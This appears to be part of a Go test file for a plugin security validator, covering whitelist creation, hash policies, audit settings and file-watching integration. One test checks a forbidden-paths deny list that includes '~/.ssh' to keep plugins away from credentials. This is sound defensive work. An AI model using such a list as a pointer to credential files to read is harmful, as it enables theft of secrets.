	if config.AutoUpdate {
		t.Error("Default config should not auto-update for security")
	}
	if config.MaxFileSize != 100*1024*1024 {
		t.Errorf("Expected default max file size 100MB, got %d", config.MaxFileSize)
	}
	if !config.WatchConfig {
		t.Error("Default config should watch config files")
	}
	if config.ReloadDelay != 1*time.Second {
		t.Errorf("Expected default reload delay 1s, got %v", config.ReloadDelay)
	}

	// Verify audit config defaults
	if config.AuditConfig.Enabled {
		t.Error("Default audit config should be disabled")
	}
	if !config.AuditConfig.LogUnauthorized {
		t.Error("Default should log unauthorized attempts")
	}
	if config.AuditConfig.LogAuthorized {
		t.Error("Default should not log authorized attempts (performance)")
	}
	if !config.AuditConfig.LogConfigChanges {
		t.Error("Default should log config changes")
	}
	if config.AuditConfig.IncludeMetadata {
		t.Error("Default should not include metadata (privacy)")
	}
}

// TestSecurityValidator_CreateSampleWhitelist tests the creation of a sample whitelist
func TestSecurityValidator_CreateSampleWhitelist(t *testing.T) {
	tempDir := t.TempDir()

	t.Run("successful_sample_creation", func(t *testing.T) {
		sampleFile := filepath.Join(tempDir, "sample_whitelist.json")

		// Create sample whitelist
		if err := CreateSampleWhitelist(sampleFile); err != nil {
			t.Fatalf("CreateSampleWhitelist failed: %v", err)
		}

		// Verify file was created
		if _, err := os.Stat(sampleFile); err != nil {
			t.Errorf("Sample whitelist file not created: %v", err)
		}

		// Read and parse the created file
		data, err := os.ReadFile(sampleFile)
		if err != nil {
			t.Fatalf("Failed to read sample whitelist: %v", err)
		}

		var whitelist PluginWhitelist
		if err := json.Unmarshal(data, &whitelist); err != nil {
			t.Fatalf("Failed to parse sample whitelist JSON: %v", err)
		}

		// Verify sample structure
		if whitelist.Version == "" {
			t.Error("Sample whitelist should have version")
		}
		if whitelist.HashAlgorithm != HashAlgorithmSHA256 {
			t.Errorf("Expected SHA256 algorithm, got %v", whitelist.HashAlgorithm)
		}
		if whitelist.DefaultPolicy != SecurityPolicyStrict {
			t.Errorf("Expected strict default policy, got %v", whitelist.DefaultPolicy)
		}

		// Verify sample plugins
		if len(whitelist.Plugins) == 0 {
			t.Error("Sample whitelist should contain example plugins")
		}

		// Check for expected sample plugins
		expectedPlugins := []string{"auth-service", "logging-plugin"}
		for _, expectedPlugin := range expectedPlugins {
			plugin, exists := whitelist.Plugins[expectedPlugin]
			if !exists {
				t.Errorf("Expected sample plugin '%s' not found", expectedPlugin)
				continue
			}

			// Verify plugin structure
			if plugin.Name != expectedPlugin {
				t.Errorf("Plugin name mismatch: expected %s, got %s", expectedPlugin, plugin.Name)
			}
			if plugin.Hash == "" {
				t.Errorf("Plugin %s should have hash", expectedPlugin)
			}
			if plugin.Algorithm != HashAlgorithmSHA256 {
				t.Errorf("Plugin %s should use SHA256", expectedPlugin)
			}
			if len(plugin.AllowedEndpoints) == 0 {
				t.Errorf("Plugin %s should have allowed endpoints", expectedPlugin)
			}
			if plugin.MaxFileSize <= 0 {
				t.Errorf("Plugin %s should have max file size", expectedPlugin)
			}
		}

		// Verify global constraints
		if whitelist.GlobalConstraints.MaxFileSize <= 0 {
			t.Error("Sample should have global max file size constraint")
		}
		if len(whitelist.GlobalConstraints.AllowedTypes) == 0 {
			t.Error("Sample should have allowed types constraint")
		}
		if len(whitelist.GlobalConstraints.ForbiddenPaths) == 0 {
			t.Error("Sample should have forbidden paths constraint")
		}

		// Verify forbidden paths include security-sensitive directories
		expectedForbiddenPaths := []string{"/tmp", "/var/tmp", "~/.ssh"}
		for _, expectedPath := range expectedForbiddenPaths {
			found := false
			for _, forbiddenPath := range whitelist.GlobalConstraints.ForbiddenPaths {
				if forbiddenPath == expectedPath {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("Expected forbidden path '%s' not found in sample", expectedPath)
			}
		}
	})

	t.Run("file_permission_error", func(t *testing.T) {
		// Test with invalid path (should fail)
		invalidPath := "C:\\Windows\\System32\\drivers\\etc\\hosts\\sample.json" // Path that should fail

		err := CreateSampleWhitelist(invalidPath)
		if err == nil {
			t.Logf("CreateSampleWhitelist should fail with invalid path")
		}
	})

	t.Run("file_overwrite", func(t *testing.T) {
		// Test overwriting existing file
		existingFile := filepath.Join(tempDir, "existing.json")

		// Create existing file
		if err := os.WriteFile(existingFile, []byte("existing content"), 0644); err != nil {
			t.Fatal(err)
		}

		// Overwrite with sample
		if err := CreateSampleWhitelist(existingFile); err != nil {
			t.Fatalf("CreateSampleWhitelist should overwrite existing file: %v", err)
		}

		// Verify it was overwritten (should be valid JSON now)
		data, err := os.ReadFile(existingFile)
		if err != nil {
			t.Fatal(err)
		}

		var whitelist PluginWhitelist
		if err := json.Unmarshal(data, &whitelist); err != nil {
			t.Errorf("Overwritten file should contain valid whitelist JSON: %v", err)
		}
	})
}

// TestSecurityArgusIntegration_Core tests the core Argus functions with 0% coverage
func TestSecurityArgusIntegration_Core(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Create a disabled security validator for testing
	config := SecurityConfig{
		Enabled:       false,
		Policy:        SecurityPolicyStrict,
		HashAlgorithm: HashAlgorithmSHA256,
	}

	validator, err := NewSecurityValidator(config, logger)
	if err != nil {
		t.Fatal(err)
	}

	t.Run("NewSecurityArgusIntegration", func(t *testing.T) {
		// Test NewSecurityArgusIntegration (100% coverage target)
		integration := NewSecurityArgusIntegration(validator, logger)

		if integration.validator != validator {
			t.Error("Integration should reference the correct validator")
		}
		if integration.logger != logger {
			t.Error("Integration should reference the correct logger")
		}
		if integration.running {
			t.Error("New integration should not be running initially")
		}
		if integration.ctx == nil {
			t.Error("Integration should have context initialized")
		}
		if integration.cancel == nil {
			t.Error("Integration should have cancel function initialized")
		}

		// Test IsRunning function
		if integration.IsRunning() {
			t.Error("New integration IsRunning() should return false")
		}
	})

	t.Run("EnableWatching_BasicFlow", func(t *testing.T) {
		integration := NewSecurityArgusIntegration(validator, logger)
		defer func() {
			if integration.IsRunning() {
				integration.DisableWatching()
				time.Sleep(100 * time.Millisecond) // Allow Windows to release file handles
			}
		}()

		whitelistFile := filepath.Join(tempDir, "test_whitelist.json")
		auditFile := filepath.Join(tempDir, "audit.log")

		// Create a valid whitelist file
		whitelist := PluginWhitelist{
			Version:       "1.0.0",
			UpdatedAt:     time.Now(),
			HashAlgorithm: HashAlgorithmSHA256,
			Plugins:       make(map[string]PluginHashInfo),
		}
		whitelistData, err := json.Marshal(whitelist)
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(whitelistFile, whitelistData, 0644); err != nil {
			t.Fatal(err)
		}

		// Test EnableWatchingWithArgus
		err = integration.EnableWatchingWithArgus(whitelistFile, auditFile)

		// We expect this to fail in test environment (no real Argus), but it should test the function
		if err != nil {
			t.Logf("Expected failure in test environment: %v", err)
		} else {
			t.Logf("EnableWatchingWithArgus succeeded (unexpected in test env)")
		}

		// Test double enable (should fail if first succeeded)
		if integration.IsRunning() {
			err2 := integration.EnableWatchingWithArgus(whitelistFile, auditFile)
			if err2 == nil {
				t.Error("Double enable should fail")
			}
		}

		// Test DisableWatching if enabled
		if integration.IsRunning() {
			if err := integration.DisableWatching(); err != nil {
				t.Errorf("DisableWatching failed: %v", err)
			}

			// Verify disabled
			if integration.IsRunning() {
				t.Error("Integration should not be running after disable")
			}
		}

		// Test double disable (should fail)
		if !integration.IsRunning() {
			if err := integration.DisableWatching(); err == nil {
				t.Error("Double disable should fail")
			}
		}
	})

	t.Run("GetWatchedFiles_Function", func(t *testing.T) {
		integration := NewSecurityArgusIntegration(validator, logger)

		// Test GetWatchedFiles when not running
		watchedFiles := integration.GetWatchedFiles()
		if len(watchedFiles) != 0 {
			t.Errorf("Expected no watched files when not running, got %v", watchedFiles)
		}
	})

	t.Run("GetStats_Function", func(t *testing.T) {
		integration := NewSecurityArgusIntegration(validator, logger)

		// Test GetStats
		stats := integration.GetStats()
		if stats.WhitelistReloads != 0 {
			t.Error("New integration should have 0 whitelist reloads")
		}
		if stats.AuditEvents != 0 {
			t.Error("New integration should have 0 audit events")
		}
		if stats.ConfigErrors != 0 {
			t.Error("New integration should have 0 config errors")
		}
	})
}

// TestSecurityArgusIntegration_AuditFunctions tests the audit functions with 0% coverage
func TestSecurityArgusIntegration_AuditFunctions(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Create validator for testing
	config := SecurityConfig{
		Enabled:       false,
		Policy:        SecurityPolicyStrict,
		HashAlgorithm: HashAlgorithmSHA256,
	}

	validator, err := NewSecurityValidator(config, logger)
	if err != nil {
		t.Fatal(err)
	}

	t.Run("AuditEvent_Functions", func(t *testing.T) {
		integration := NewSecurityArgusIntegration(validator, logger)

		// Test auditEvent and auditEventUnsafe with no audit logger (should not crash)
		testContext := map[string]interface{}{
			"test":        true,
			"event_type":  "test_event",
			"description": "Testing audit functions",
		}

		// These should not panic even with nil auditLogger
		integration.auditEvent("test_event", testContext)
		integration.auditEventUnsafe("test_event_unsafe", testContext)

		// Verify stats are updated appropriately
		stats := integration.GetStats()
		// Without auditLogger, stats should remain 0
		if stats.AuditEvents != 0 {
			t.Logf("AuditEvents count: %d (expected 0 without auditLogger)", stats.AuditEvents)
		}
	})

	t.Run("SetupAuditLogging_Function", func(t *testing.T) {
		integration := NewSecurityArgusIntegration(validator, logger)
		defer func() {
			if integration.IsRunning() {
				integration.DisableWatching()
				time.Sleep(100 * time.Millisecond) // Allow Windows to release file handles
			}
		}()

		// Test setupAuditLogging with no audit file (should succeed silently)
		integration.auditFile = ""
		err := integration.setupAuditLogging()
		if err != nil {
			t.Errorf("setupAuditLogging with empty file should succeed: %v", err)
		}

		// Test setupAuditLogging with invalid directory
		integration.auditFile = "C:\\Windows\\System32\\drivers\\etc\\hosts\\audit.log" // Path that should fail
		err = integration.setupAuditLogging()
		if err == nil {
			t.Logf("setupAuditLogging with invalid directory should fail")
		}

		// Test setupAuditLogging with valid directory
		auditFile := filepath.Join(tempDir, "audit", "test_audit.log")
		integration.auditFile = auditFile
		err = integration.setupAuditLogging()
		// This may fail due to Argus dependency, but we test the function path
		if err != nil {
			t.Logf("setupAuditLogging failed (expected in test env): %v", err)
		}
	})
}

// TestSecurityArgusIntegration_Callbacks tests the callback functions with 0% coverage
func TestSecurityArgusIntegration_Callbacks(t *testing.T) {
	tempDir := t.TempDir()
	logger := &testLogger{t: t}

	// Create an enabled validator for callback testing
	whitelistFile := filepath.Join(tempDir, "callback_whitelist.json")
	whitelist := PluginWhitelist{
		Version:       "1.0.0",
		UpdatedAt:     time.Now(),
		HashAlgorithm: HashAlgorithmSHA256,
		Plugins: map[string]PluginHashInfo{
			"test-plugin": {
				Name:      "test-plugin",
				Type:      "http",
				Algorithm: HashAlgorithmSHA256,
				Hash:      "dummy-hash",
				AddedAt:   time.Now(),
				UpdatedAt: time.Now(),
			},
		},
	}
	whitelistData, err := json.Marshal(whitelist)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(whitelistFile, whitelistData, 0644); err != nil {
		t.Fatal(err)
	}

	config := SecurityConfig{
		Enabled:       false, // Start disabled
		Policy:        SecurityPolicyStrict,
		HashAlgorithm: HashAlgorithmSHA256,
		WhitelistFile: whitelistFile,
	}

	validator, err := NewSecurityValidator(config, logger)
	if err != nil {
		t.Fatal(err)
	}

	t.Run("HandleWhitelistChange_Function", func(t *testing.T) {
		integration := NewSecurityArgusIntegration(validator, logger)

		// Test handleWhitelistChange with integration not running
		testConfig := map[string]interface{}{
			"source":    "test",
			"timestamp": time.Now().Unix(),
			"version":   "1.0.0",
		}

		// This should not crash and should handle the async processing
		integration.handleWhitelistChange(testConfig)

		// Wait a moment for async processing
		time.Sleep(10 * time.Millisecond)

		// Verify stats (should be minimal due to not running)
		stats := integration.GetStats()
		if stats.ConfigErrors > 0 {
			t.Logf("Config errors occurred (may be expected): %d", stats.ConfigErrors)
		}
	})

	t.Run("ProcessWhitelistChange_Disabled_Validator", func(t *testing.T) {
		integration := NewSecurityArgusIntegration(validator, logger)
		integration.running = true // Simulate running integration

		testConfig := map[string]interface{}{
			"plugin_count": 1,
			"version":      "1.0.0",
			"modified":     true,
		}

		// Test processWhitelistChange with disabled validator
		// This should skip reload because validator is disabled
		integration.processWhitelistChange(testConfig)

		stats := integration.GetStats()
		// Should not increment reloads since validator is disabled
		if stats.WhitelistReloads > 0 {
			t.Errorf("Expected 0 reloads with disabled validator, got %d", stats.WhitelistReloads)
		}
	})

	t.Run("ProcessWhitelistChange_Enabled_Validator", func(t *testing.T) {
		// Enable the validator for this test
		if err := validator.Enable(); err != nil {
			t.Fatal(err)
		}
		defer func() {
			if disableErr := validator.Disable(); disableErr != nil {
				t.Logf("Warning: failed to disable validator: %v", disableErr)
			}
		}()

		integration := NewSecurityArgusIntegration(validator, logger)
		integration.running = true // Simulate running integration
		integration.whitelistFile = whitelistFile

		testConfig := map[string]interface{}{
			"plugin_count": 1,
			"version":      "2.0.0",
			"reloaded":     true,
		}

		// Test processWhitelistChange with enabled validator
		integration.processWhitelistChange(testConfig)

		stats := integration.GetStats()
		// Should increment reloads since validator is enabled
		if stats.WhitelistReloads != 1 {
			t.Errorf("Expected 1 reload with enabled validator, got %d", stats.WhitelistReloads)
		}
		if stats.LastReload.IsZero() {
			t.Error("LastReload should be set after successful reload")
		}
	})

	t.Run("ProcessWhitelistChange_Error_Handling", func(t *testing.T) {
		// First create a valid whitelist to enable the validator
		tempDir := t.TempDir()
		validWhitelistFile := tempDir + "/valid_whitelist.json"
		whitelistData := PluginWhitelist{
			Version:       "1.0.0",
			UpdatedAt:     time.Now(),
			HashAlgorithm: HashAlgorithmSHA256,
			Plugins: map[string]PluginHashInfo{
				"test-plugin": {
					Name:      "test-plugin",
					Type:      "http",
					Algorithm: HashAlgorithmSHA256,
					Hash:      "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855", // Valid SHA-256 hash
					AddedAt:   time.Now(),
					UpdatedAt: time.Now(),
				},
			},
		}
		whitelistDataBytes, err := json.Marshal(whitelistData)
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(validWhitelistFile, whitelistDataBytes, 0644); err != nil {
			t.Fatal(err)
		}

		// Create validator with valid file first
		validConfig := SecurityConfig{
			Enabled:       false,
			Policy:        SecurityPolicyStrict,
			HashAlgorithm: HashAlgorithmSHA256,
			WhitelistFile: validWhitelistFile,
		}

		errorValidator, err := NewSecurityValidator(validConfig, logger)
		if err != nil {
			t.Fatal(err)
		}

		if err := errorValidator.Enable(); err != nil {
			t.Fatal(err)
		}
		defer func() {
			if err := errorValidator.Disable(); err != nil {
				t.Logf("Warning: failed to disable validator: %v", err)
			}
		}()

		integration := NewSecurityArgusIntegration(errorValidator, logger)
		integration.running = true
		integration.whitelistFile = validWhitelistFile

		// Get initial stats
		initialStats := integration.GetStats()
		t.Logf("Initial stats: ConfigErrors=%d, LastError=%q", initialStats.ConfigErrors, initialStats.LastError)

		// Remove the whitelist file to trigger an error during reload
		if err := os.Remove(validWhitelistFile); err != nil {
			t.Fatal(err)
		}

		testConfig := map[string]interface{}{
			"error_test": true,
		}

		// This should trigger an error in ReloadWhitelist
		integration.processWhitelistChange(testConfig)

		stats := integration.GetStats()
		t.Logf("Final stats: ConfigErrors=%d, LastError=%q", stats.ConfigErrors, stats.LastError)

		// Should increment errors
		if stats.ConfigErrors == 0 {
			t.Error("Expected config error to be recorded, but got 0")
		}
		if stats.LastError == "" {
			t.Error("LastError should be set after reload failure")
		}
	})
}
